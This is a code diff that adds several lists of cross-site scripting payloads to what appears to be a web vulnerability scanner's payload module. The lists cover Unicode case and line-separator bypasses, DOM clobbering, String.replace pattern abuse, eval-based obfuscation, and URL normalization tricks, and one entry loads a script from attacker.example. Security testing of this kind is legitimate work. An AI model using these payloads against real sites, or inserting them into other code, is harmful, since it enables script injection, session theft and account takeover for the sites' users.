@@ -225,6 +225,65 @@ STORED_XSS = [
     "document.write(localStorage.getItem('xss'))</script>",
 ]
 
+# toUpperCase() Unicode normalization bypass
+UNICODE_CASE_BYPASS = [
+    "<ſvg onload=alert('{marker}')>",
+    "<ſcript>alert('{marker}')</ſcript>",
+    "<ſcript/ſrc=//attacker.example/{marker}.js></ſcript>",
+    "<ımg src=x onerror=alert('{marker}')>",
+    "<ſVG/onload=alert('{marker}')>",
+    "<ſvg><ſcript>alert&#40;'{marker}')</ſcript>",
+]
+
+# U+2028 (Line Separator) / U+2029 (Paragraph Separator) as JS line terminators
+UNICODE_LINE_SEP = [
+    "\u2028alert('{marker}')\u2028-->",
+    "\u2029alert('{marker}')\u2029-->",
+    "\u2028alert('{marker}')\u2028//",
+    "\u2029alert('{marker}')\u2029//",
+    "\u2028`+alert('{marker}')+`\u2028",
+]
+
+# DOM Clobbering — overwrite named DOM properties via id= / name= attributes
+# to tamper with JS logic that reads document.x, window.x, or form.action
+DOM_CLOBBERING = [
+    '<input name=action value="javascript:alert(\'{marker}\')">',
+    '<a id=x href="javascript:alert(\'{marker}\')">',
+    '<form id=x><input name=action value="javascript:alert(\'{marker}\')"></form>',
+    '<img id=x name=x src=x onerror=alert(\'{marker}\')>',
+    '<form name=x><input name=y value="javascript:alert(\'{marker}\')"></form>',
+    '<a id=__proto__ name=innerHTML href="<img src=x onerror=alert(\'{marker}\')>">',
+]
+
+# String.replace() special replacement patterns
+REPLACE_PATTERN = [
+    "$`onerror=alert('{marker}') x=",
+    "$&alert('{marker}')",
+    "$'onerror=alert('{marker}') x=",
+    "$`><img src=x onerror=alert('{marker}')>",
+    "$&><svg onload=alert('{marker}')>",
+]
+
+# Radix-based JavaScript obfuscation
+RADIX_OBFUSCATION = [
+    "<script>eval(13459750..toString(30))('{marker}')</script>",
+    "<script>eval(0xCD34E6.toString(30))('{marker}')</script>",
+    "<script>for((i)in(self))eval(i)('{marker}')</script>",
+    "<script>eval(13459750..toString(30))('{marker}')</script>",
+    "<script>eval(String.fromCharCode(97,108,101,114,116))('{marker}')</script>",
+    "<script>eval(atob('YWxlcnQ='))('{marker}')</script>",
+]
+
+# Unicode URL / domain normalization bypass
+UNICODE_URL = [
+    "javascript\u2044alert('{marker}')",
+    "//trusted.example%2f@attacker.example/{marker}",
+    "//prompt.ml%2f@\u2494\u20a8/{marker}",
+    "java\x00script:alert('{marker}')",
+    "javascript\x01:alert('{marker}')",
+    "JAVASCRIPT:alert('{marker}')",
+]
+
 # Content-type vectors — SVG, XML, XSL, XHTML responses
 CONTENT_TYPE = [
     "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('{marker}')\"/>",
